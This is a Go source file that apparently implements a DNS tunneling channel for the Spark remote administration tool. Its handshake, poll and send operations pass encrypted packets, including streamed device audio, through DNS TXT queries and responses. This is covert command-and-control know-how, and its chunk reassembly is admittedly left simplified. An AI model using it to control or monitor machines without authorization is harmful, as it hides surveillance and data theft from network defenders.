package dns

import (
	"Spark/modules"
	"Spark/server/common"
	"Spark/server/handler/audio"
	"Spark/server/handler/utility"
	"Spark/utils"
	"Spark/utils/cmap"
	"context"
	cryptoRand "crypto/rand"
	"encoding/base32"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
	"go.opentelemetry.io/otel"
	"go.opentelemetry.io/otel/attribute"
	"golang.org/x/time/rate"
)

const (
	// Configuration constants
	defaultDNSPort       = "53"
	maxDNSMessageSize    = 512          // Standard DNS UDP message size
	maxTXTRecordSize     = 255          // Max TXT record length
	dnsTTL               = 60           // DNS TTL in seconds
	sessionTimeout       = 5 * time.Minute
	maxChunks            = 100          // Max chunks per message
	cleanupInterval      = 1 * time.Minute

	// Rate limiting constants
	rateLimitQPS         = 10           // Queries per second per IP
	rateLimitBurst       = 20           // Burst allowance per IP
	rateLimiterCleanup   = 5 * time.Minute
)

// DNSSession represents a DNS tunneling session
type DNSSession struct {
	UUID         string
	Secret       []byte
	LastSeen     time.Time
	MessageQueue chan *modules.Packet
	ChunkBuffer  map[uint32]map[int]string // seq -> chunk_id -> data
	mu           sync.RWMutex
	ctx          context.Context
	cancel       context.CancelFunc
}

// rateLimiter stores rate limiter and last access time for cleanup
type rateLimiter struct {
	limiter  *rate.Limiter
	lastSeen time.Time
}

// DNSServer manages DNS tunneling
type DNSServer struct {
	sessions     cmap.ConcurrentMap[string, *DNSSession]
	rateLimiters cmap.ConcurrentMap[string, *rateLimiter]
	domain       string
	addr         string
	conn         *net.UDPConn
	mu           sync.RWMutex
	ctx          context.Context
	cancel       context.CancelFunc
}

var (
	dnsServer *DNSServer
	tracer    = otel.Tracer("spark-server/dns")
)

func init() {
	// Register send function with common package
	common.RegisterDNSSender(func(uuid string, packet *modules.Packet) bool {
		if dnsServer != nil {
			return dnsServer.SendToDNSClient(uuid, packet)
		}
		return false
	})
}

// NewDNSServer creates a new DNS server
func NewDNSServer(addr, domain string) (*DNSServer, error) {
	ctx, cancel := context.WithCancel(context.Background())

	server := &DNSServer{
		addr:         addr,
		domain:       domain,
		sessions:     cmap.New[*DNSSession](),
		rateLimiters: cmap.New[*rateLimiter](),
		ctx:          ctx,
		cancel:       cancel,
	}

	return server, nil
}

// Start starts the DNS server
func (s *DNSServer) Start() error {
	// Resolve UDP address
	udpAddr, err := net.ResolveUDPAddr("udp", s.addr)
	if err != nil {
		return fmt.Errorf("invalid DNS address: %w", err)
	}

	// Listen on UDP
	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on UDP: %w", err)
	}

	s.mu.Lock()
	s.conn = conn
	s.mu.Unlock()

	common.Info(nil, "DNS_SERVER_STARTED", "", "", map[string]any{
		"addr":   s.addr,
		"domain": s.domain,
	})

	// Start cleanup goroutines
	go s.cleanupLoop()
	go s.rateLimiterCleanupLoop()

	// Start handling requests
	go s.handleRequests()

	return nil
}

// handleRequests handles incoming DNS requests
func (s *DNSServer) handleRequests() {
	buf := make([]byte, maxDNSMessageSize)

	for {
		select {
		case <-s.ctx.Done():
			return
		default:
		}

		n, remoteAddr, err := s.conn.ReadFromUDP(buf)
		if err != nil {
			if errors.Is(err, net.ErrClosed) {
				return
			}
			common.Warn(nil, "DNS_READ_ERROR", "", err.Error(), nil)
			continue
		}

		// Handle query in goroutine
		go s.handleQuery(buf[:n], remoteAddr)
	}
}

// handleQuery handles a single DNS query
func (s *DNSServer) handleQuery(data []byte, remoteAddr *net.UDPAddr) {
	ctx, span := tracer.Start(s.ctx, "dns.query")
	defer span.End()

	// Check rate limit
	clientIP := remoteAddr.IP.String()
	if !s.checkRateLimit(clientIP) {
		span.SetAttributes(attribute.String("rate_limit", "exceeded"))
		common.Warn(nil, "DNS_RATE_LIMIT_EXCEEDED", "", clientIP, nil)
		// Send empty response or SERVFAIL
		s.sendErrorResponse(data, remoteAddr, dns.RcodeServerFailure)
		return
	}

	// Parse DNS query using proper DNS library
	query, err := s.parseDNSQuery(data)
	if err != nil {
		span.RecordError(err)
		common.Warn(nil, "DNS_PARSE_ERROR", "", err.Error(), nil)
		s.sendErrorResponse(data, remoteAddr, dns.RcodeFormatError)
		return
	}

	span.SetAttributes(
		attribute.String("dns.query", query),
		attribute.String("dns.remote_addr", remoteAddr.String()),
	)

	// Check if query is for our domain
	if !strings.HasSuffix(query, "."+s.domain) {
		// Not our query, ignore
		return
	}

	// Remove domain suffix
	subdomain := strings.TrimSuffix(query, "."+s.domain)

	// Parse subdomain to extract operation
	// Format: <operation>.<seq>.<chunk>.<data>.<uuid>
	parts := strings.Split(subdomain, ".")

	if len(parts) < 2 {
		common.Warn(nil, "DNS_INVALID_QUERY", "", query, nil)
		return
	}

	operation := parts[0]

	// Extract UUID and Key based on operation
	// Format varies: handshake.<uuid>.<key> vs poll.<seq>.<uuid> vs send.<seq>.<chunk>.<data>.<uuid>
	var uuid, key string
	switch operation {
	case "handshake":
		// handshake.<uuid>.<key>.<domain>
		if len(parts) < 3 {
			common.Warn(nil, "DNS_INVALID_HANDSHAKE", "", "insufficient parts", nil)
			return
		}
		uuid = parts[1]
		key = parts[2]
	case "poll", "send":
		// Last part is always UUID
		uuid = parts[len(parts)-1]
	default:
		uuid = parts[len(parts)-1]
	}

	// Route based on operation
	var response string
	switch operation {
	case "handshake":
		response = s.handleHandshake(ctx, uuid, key)
	case "poll":
		response = s.handlePoll(ctx, uuid, parts)
	case "send":
		response = s.handleSend(ctx, uuid, parts)
	default:
		common.Warn(nil, "DNS_UNKNOWN_OPERATION", "", operation, nil)
		return
	}

	// Send DNS response
	if err := s.sendDNSResponse(data, response, remoteAddr); err != nil {
		span.RecordError(err)
		common.Warn(nil, "DNS_RESPONSE_ERROR", "", err.Error(), nil)
	}
}

// handleHandshake handles DNS handshake
// Format: handshake.<uuid>.<key>.<domain>
func (s *DNSServer) handleHandshake(ctx context.Context, uuid string, key string) string {
	// Verify device exists with proper key validation
	_, ok := common.CheckDevice(uuid, key)
	if !ok {
		return "error=invalid_credentials"
	}

	// Generate a fresh random secret for this session (security best practice)
	secret := make([]byte, 32)
	if _, err := cryptoRand.Read(secret); err != nil {
		common.Warn(nil, "DNS_HANDSHAKE_SECRET_FAILED", uuid, err.Error(), nil)
		return "error=secret_generation_failed"
	}

	// Create session
	sessionCtx, cancel := context.WithCancel(ctx)

	session := &DNSSession{
		UUID:         uuid,
		Secret:       secret,
		LastSeen:     time.Now(),
		MessageQueue: make(chan *modules.Packet, 100),
		ChunkBuffer:  make(map[uint32]map[int]string),
		ctx:          sessionCtx,
		cancel:       cancel,
	}

	s.sessions.Set(uuid, session)

	// Register session with transport registry for server→client sends
	registry := common.GetTransportRegistry()
	registry.Register(uuid, common.TransportDNS, func(packet *modules.Packet) bool {
		return s.SendToDNSClient(uuid, packet)
	})

	common.Info(nil, "DNS_SESSION_CREATED", uuid, "", nil)

	// Return secret in TXT record
	// Format: secret=<base32-encoded-secret>
	return "secret=" + encodeBase32(session.Secret)
}

// handlePoll handles DNS poll request
// Format: poll.<seq>.<uuid>.<domain>
func (s *DNSServer) handlePoll(ctx context.Context, uuid string, parts []string) string {
	// Verify session exists
	session, ok := s.sessions.Get(uuid)
	if !ok {
		return "error=session_not_found"
	}

	// Verify device is still registered (authentication check)
	if !common.Devices.Has(uuid) {
		// Session exists but device was unregistered - remove session
		s.removeSession(uuid)
		return "error=unauthorized"
	}

	// Update last seen
	session.mu.Lock()
	session.LastSeen = time.Now()
	session.mu.Unlock()

	// Check for queued messages
	select {
	case msg := <-session.MessageQueue:
		// Marshal and encrypt message
		data, err := json.Marshal(msg)
		if err != nil {
			return "error=marshal_failed"
		}

		encData, err := utils.Encrypt(data, session.Secret)
		if err != nil {
			return "error=encrypt_failed"
		}

		// Encode to base32 (DNS-safe)
		return encodeBase32(encData)

	default:
		// No messages
		return ""
	}
}

// handleSend handles DNS send request
// Format: send.<seq>.<chunk>.<data>.<uuid>.<domain>
func (s *DNSServer) handleSend(ctx context.Context, uuid string, parts []string) string {
	if len(parts) < 4 {
		return "error=invalid_format"
	}

	// Verify session exists
	session, ok := s.sessions.Get(uuid)
	if !ok {
		return "error=session_not_found"
	}

	// Verify device is still registered (authentication check)
	if !common.Devices.Has(uuid) {
		// Session exists but device was unregistered - remove session
		s.removeSession(uuid)
		return "error=unauthorized"
	}

	// Update last seen
	session.mu.Lock()
	session.LastSeen = time.Now()
	session.mu.Unlock()

	// Extract seq, chunk, and data
	// This is simplified - in production, implement proper chunk reassembly
	// seq := parts[1]
	// chunk := parts[2]
	data := parts[3]

	// Decode base32 data
	decoded, err := decodeBase32(data)
	if err != nil {
		return "error=decode_failed"
	}

	// Decrypt
	decrypted, err := utils.Decrypt(decoded, session.Secret)
	if err != nil {
		return "error=decrypt_failed"
	}

	// Unmarshal packet
	var packet modules.Packet
	if err := json.Unmarshal(decrypted, &packet); err != nil {
		return "error=unmarshal_failed"
	}

	// Route packet
	if err := s.routePacket(uuid, &packet); err != nil {
		return "error=route_failed"
	}

	return "ok"
}

// parseDNSQuery parses DNS query using proper DNS library
func (s *DNSServer) parseDNSQuery(data []byte) (string, error) {
	msg := new(dns.Msg)
	if err := msg.Unpack(data); err != nil {
		return "", fmt.Errorf("failed to parse DNS message: %w", err)
	}

	if len(msg.Question) == 0 {
		return "", errors.New("no questions in DNS query")
	}

	// Return the first question's name (without trailing dot)
	name := msg.Question[0].Name
	return strings.TrimSuffix(name, "."), nil
}

// sendErrorResponse sends a DNS error response
func (s *DNSServer) sendErrorResponse(query []byte, remoteAddr *net.UDPAddr, rcode int) error {
	msg := new(dns.Msg)
	if err := msg.Unpack(query); err != nil {
		return err
	}

	resp := new(dns.Msg)
	resp.SetRcode(msg, rcode)

	response, err := resp.Pack()
	if err != nil {
		return err
	}

	s.mu.RLock()
	conn := s.conn
	s.mu.RUnlock()

	if conn == nil {
		return errors.New("DNS server not running")
	}

	_, err = conn.WriteToUDP(response, remoteAddr)
	return err
}

// sendDNSResponse sends a DNS TXT response using proper DNS library
func (s *DNSServer) sendDNSResponse(query []byte, txt string, remoteAddr *net.UDPAddr) error {
	// Parse the incoming DNS query
	msg := new(dns.Msg)
	if err := msg.Unpack(query); err != nil {
		return fmt.Errorf("failed to parse DNS query: %w", err)
	}

	// Create response message
	resp := new(dns.Msg)
	resp.SetReply(msg)
	resp.Authoritative = true
	resp.RecursionAvailable = false

	// Add TXT record answer if we have data to return
	if txt != "" && len(msg.Question) > 0 {
		// Split TXT data into 255-byte chunks (DNS TXT record limit)
		txtChunks := splitTXTData(txt)

		txtRecord := &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   msg.Question[0].Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    dnsTTL,
			},
			Txt: txtChunks,
		}
		resp.Answer = append(resp.Answer, txtRecord)
	}

	// Pack the response
	response, err := resp.Pack()
	if err != nil {
		return fmt.Errorf("failed to pack DNS response: %w", err)
	}

	// Send response
	s.mu.RLock()
	conn := s.conn
	s.mu.RUnlock()

	if conn == nil {
		return errors.New("DNS server not running")
	}

	_, err = conn.WriteToUDP(response, remoteAddr)
	return err
}

// splitTXTData splits data into chunks of 255 bytes or less for TXT records
func splitTXTData(data string) []string {
	const maxChunkSize = 255
	var chunks []string

	for len(data) > 0 {
		chunkSize := len(data)
		if chunkSize > maxChunkSize {
			chunkSize = maxChunkSize
		}
		chunks = append(chunks, data[:chunkSize])
		data = data[chunkSize:]
	}

	return chunks
}

// routePacket routes incoming packet to appropriate handler
// Mimics the WebSocket message handling flow (wsOnMessageBinary)
func (s *DNSServer) routePacket(uuid string, packet *modules.Packet) error {
	common.Info(nil, "DNS_PACKET_RECEIVED", uuid, packet.Act, map[string]any{
		"packet_act": packet.Act,
	})

	// Handle AUDIO_DATA packets (streaming audio from client)
	if packet.Act == `AUDIO_DATA` {
		if err := audio.HandleAudioData(*packet, uuid); err != nil {
			common.Warn(nil, "DNS_AUDIO_DATA_ERROR", uuid, err.Error(), nil)
			return err
		}
		return nil
	}

	// Handle DEVICE_UP and DEVICE_UPDATE packets specially (same as WebSocket)
	if packet.Act == `DEVICE_UP` || packet.Act == `DEVICE_UPDATE` {
		// Marshal packet back to JSON for OnDevicePackWithUUID
		data, err := utils.JSON.Marshal(packet)
		if err != nil {
			common.Warn(nil, "DNS_PACKET_MARSHAL_FAILED", uuid, err.Error(), nil)
			return err
		}

		// For DNS we don't track remote address, use "Unknown"
		// DNS queries typically go through recursive resolvers so the source IP isn't meaningful
		remoteAddr := "DNS"

		// Call the transport-agnostic device packet handler
		return utility.OnDevicePackWithUUID(
			data,
			uuid,
			remoteAddr,
			func(resp modules.Packet) {
				// Send response back to client via DNS
				s.SendToDNSClient(uuid, &resp)
			},
			func() {
				// Close session on error
				s.removeSession(uuid)
			},
		)
	}

	// For other actions, verify device is registered (same as WebSocket)
	if !common.Devices.Has(uuid) {
		common.Warn(nil, "DNS_PACKET_INVALID", uuid, "device not registered", map[string]any{
			"action": packet.Act,
		})
		return errors.New("device not registered")
	}

	// Route to event system for callback-based handling
	// Use CallEventByUUID instead of CallEvent since we don't have a melody session
	common.CallEventByUUID(*packet, uuid)

	return nil
}

// SendToDNSClient sends a packet to a DNS client
func (s *DNSServer) SendToDNSClient(uuid string, packet *modules.Packet) bool {
	session, ok := s.sessions.Get(uuid)
	if !ok {
		return false
	}

	select {
	case session.MessageQueue <- packet:
		return true
	default:
		common.Warn(nil, "DNS_QUEUE_FULL", uuid, "", nil)
		return false
	}
}

// checkRateLimit checks if a request from an IP is allowed
func (s *DNSServer) checkRateLimit(ip string) bool {
	// Get or create rate limiter for this IP
	var limiter *rate.Limiter

	if rl, ok := s.rateLimiters.Get(ip); ok {
		rl.lastSeen = time.Now()
		limiter = rl.limiter
	} else {
		limiter = rate.NewLimiter(rate.Limit(rateLimitQPS), rateLimitBurst)
		s.rateLimiters.Set(ip, &rateLimiter{
			limiter:  limiter,
			lastSeen: time.Now(),
		})
	}

	return limiter.Allow()
}

// rateLimiterCleanupLoop periodically removes inactive rate limiters
func (s *DNSServer) rateLimiterCleanupLoop() {
	ticker := time.NewTicker(rateLimiterCleanup)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			now := time.Now()
			s.rateLimiters.IterCb(func(ip string, rl *rateLimiter) bool {
				if now.Sub(rl.lastSeen) > rateLimiterCleanup {
					s.rateLimiters.Remove(ip)
				}
				return true
			})
		}
	}
}

// cleanupLoop periodically removes expired sessions
func (s *DNSServer) cleanupLoop() {
	ticker := time.NewTicker(cleanupInterval)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.cleanup()
		}
	}
}

// cleanup removes expired sessions
func (s *DNSServer) cleanup() {
	now := time.Now()
	s.sessions.IterCb(func(uuid string, session *DNSSession) bool {
		session.mu.RLock()
		lastSeen := session.LastSeen
		session.mu.RUnlock()

		if now.Sub(lastSeen) > sessionTimeout {
			s.removeSession(uuid)
		}
		return true
	})
}

// removeSession removes a session
func (s *DNSServer) removeSession(uuid string) {
	if session, ok := s.sessions.Get(uuid); ok {
		session.cancel()
		close(session.MessageQueue)
		s.sessions.Remove(uuid)

		// Unregister from transport registry
		registry := common.GetTransportRegistry()
		registry.Unregister(uuid)

		common.Info(nil, "DNS_SESSION_REMOVED", uuid, "", nil)
	}
}

// Stop stops the DNS server
func (s *DNSServer) Stop() error {
	s.cancel()

	s.mu.Lock()
	conn := s.conn
	s.conn = nil
	s.mu.Unlock()

	if conn != nil {
		conn.Close()
	}

	// Close all sessions
	s.sessions.IterCb(func(uuid string, session *DNSSession) bool {
		s.removeSession(uuid)
		return true
	})

	common.Info(nil, "DNS_SERVER_STOPPED", "", "", nil)

	return nil
}

// Helper functions

// encodeBase32 encodes data to base32 (DNS-safe)
func encodeBase32(data []byte) string {
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	return strings.ToLower(encoded)
}

// decodeBase32 decodes base32-encoded data
func decodeBase32(s string) ([]byte, error) {
	s = strings.ToUpper(s)
	return base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(s)
}

// StartDNSServer starts the global DNS server
func StartDNSServer(addr, domain string) error {
	var err error
	dnsServer, err = NewDNSServer(addr, domain)
	if err != nil {
		return err
	}

	return dnsServer.Start()
}

// StopDNSServer stops the global DNS server
func StopDNSServer() error {
	if dnsServer != nil {
		return dnsServer.Stop()
	}
	return nil
}

// SendPacketToDNS sends a packet to a DNS client (global function)
func SendPacketToDNS(uuid string, packet *modules.Packet) bool {
	if dnsServer != nil {
		return dnsServer.SendToDNSClient(uuid, packet)
	}
	return false
}

// GetDNSSessionCount returns the number of active DNS sessions
func GetDNSSessionCount() int {
	if dnsServer != nil {
		return dnsServer.sessions.Count()
	}
	return 0
}
